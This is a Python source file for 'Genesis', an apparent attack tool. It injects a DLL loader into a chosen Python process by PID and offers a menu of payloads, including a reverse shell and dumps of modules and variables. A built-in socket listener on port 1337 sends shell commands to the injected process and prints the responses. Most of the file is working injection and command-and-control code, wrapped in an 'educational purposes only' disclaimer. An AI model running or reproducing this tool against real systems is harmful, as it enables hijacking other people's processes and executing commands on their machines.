import colorama, os, time
import socket, threading
from libs import injector

BANNER = colorama.Fore.CYAN + r"""
          ___________________ _______  ___________ _________.___  _________
         /  _____/\_   _____/ \      \ \_   _____//   _____/|   |/   _____/
        /   \  ___ |    __)_  /   |   \ |    __)_ \_____  \ |   |\_____  \ 
        \    \_\  \|        \/    |    \|        \/        \|   |/        \
         \______  /_______  /\____|__  /_______  /_______  /|___/_______  /
                \/        \/         \/        \/        \/             \/ 
"""

LOADER = "PyInjector-x64.dll"


Payloads = {
    "Python Reverse Shell": "/payloads/python_reverseshell.py",
    "Dump Modules": "/payloads/dump_modules.py",
    "Dump Variables": "/payloads/dump_vars.py",
    # "Dump Memory": "/payloads/dump_memory.py",
    "Custom Payload": "/payloads/custom.py"
}

class PythonShell:

    def __init__(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind(("localhost", 1337))
        
    def listen(self):
        self.server.listen(1)
        self.client, self.addr = self.server.accept()
        print(colorama.Fore.GREEN + "\n  [+] Connected to: " + str(self.addr) + colorama.Fore.RESET)
        self.shell()

    def shell(self):
        while True:
            try:
                command = input(colorama.Fore.BLUE + "\n  [>] Python Shell: " + colorama.Fore.RESET)
                self.client.send(command.encode())
                print(colorama.Fore.CYAN + "  [+] Response: " + self.client.recv(1024).decode() + colorama.Fore.RESET)
            except:
                print(colorama.Fore.RED + "  [!] Disconnected." + colorama.Fore.RESET)
                break



class Main:

    def Clear(self):
        print(colorama.Fore.RESET)
        os.system("cls")

    def Main(self):


        self.Clear()
        os.system('title Genesis ^| Awaiting for target process...')
        print(BANNER)
        print(colorama.Fore.YELLOW + "  (!) DISCLAIMER: This tool is for educational purposes only.")
        print(colorama.Fore.YELLOW + "  (!) I am not responsible for any damage done using this tool.")
        print(colorama.Fore.YELLOW + "  (*) Make sure the target proccess is in the exact same directory of this tool.")
        print(colorama.Fore.CYAN + "  (>) LOADER Path: " + LOADER + "\n" + colorama.Fore.RESET)

        # display all python processes running
        for i in injector.getpids():
            print(colorama.Fore.CYAN + "  [*] PID: " + str(i) + f"{' (Current)' if i == os.getpid() else ''}{colorama.Fore.RESET}")
        print('\n')

        try:
            pid = int(input(colorama.Fore.BLUE + "  [>] Enter PID: " + colorama.Fore.RESET))
        except:
            print(colorama.Fore.RED + "  [!] Invalid PID." + colorama.Fore.RESET)
            exit()
            
        os.system('title Genesis ^| PID: ' + str(pid) + ' ^| Injecting...')

        print('\n')

        for i in range(len(Payloads)):
            print(colorama.Fore.CYAN + "  [{}] {}".format(i+1, list(Payloads.keys())[i]))

        print(colorama.Fore.RESET)

        choice = input(colorama.Fore.BLUE + "  [>] Choice: " + colorama.Fore.RESET)
        
        if choice <= str(len(Payloads)):
            with open('code.py', 'w') as code:
                code.write(open(os.getcwd() + Payloads[list(Payloads.keys())[int(choice)-1]], 'r').read())
        else:
            print(colorama.Fore.RED + "  [!] Invalid Choice." + colorama.Fore.RESET)
            exit()

        if choice == "1":
            SHELL = PythonShell()
            threading.Thread(target=SHELL.listen).start()
            
        
        injector.injectdll(pid, LOADER)
        os.system('title Genesis ^| PID: ' + str(pid) + ' ^| Injected')

        with open('code.py', 'w') as f:
            f.close()

        print(colorama.Fore.GREEN + "\n  [+] Injected." + colorama.Fore.RESET)
        input()
            


        


if __name__ == "__main__":
    Main().Main()




